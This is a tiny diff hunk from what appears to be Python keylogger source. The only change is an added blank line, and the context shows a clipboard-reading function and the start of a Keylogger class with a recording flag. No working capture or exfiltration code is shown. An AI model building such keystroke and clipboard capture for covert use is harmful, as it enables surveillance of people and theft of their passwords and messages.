@@ -19,6 +19,7 @@ def copy_clipboard(text_file, old_clipboard, new_clipboard):
     new_clipboard = pc.paste()
     return old_clipboard, new_clipboard
 
+
 class Keylogger:
     def __init__(self):
         self.is_recording = False
